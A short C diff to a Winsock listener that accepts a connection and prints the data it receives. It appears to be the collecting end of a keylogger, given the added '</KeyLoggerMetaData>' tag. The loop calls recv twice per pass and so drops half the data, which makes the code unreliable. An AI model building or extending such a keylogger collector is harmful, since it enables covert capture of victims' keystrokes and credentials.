@@ -32,6 +32,7 @@ int main()
         return -1;
     }
     fprintf(stderr, "accepted\n\t\t[*]Listening: ");
+
     listen(Listener,3);
     cL=sizeof(target);
     acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
@@ -41,11 +42,14 @@ int main()
         return -1;
     }
     fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
-    while(1)
+    while(recv(acceptedTarget,buffer,0x1001,0)!=  SOCKET_ERROR)
     {
         recv(acceptedTarget,buffer,0x1001,0);
         *(buffer+0x1000)=0x00;
         printf("%s",buffer);
     }
+    printf("\n</KeyLoggerMetaData>\n");
+    closesocket(acceptedTarget);
+    WSACleanup();
     return 0;
 }
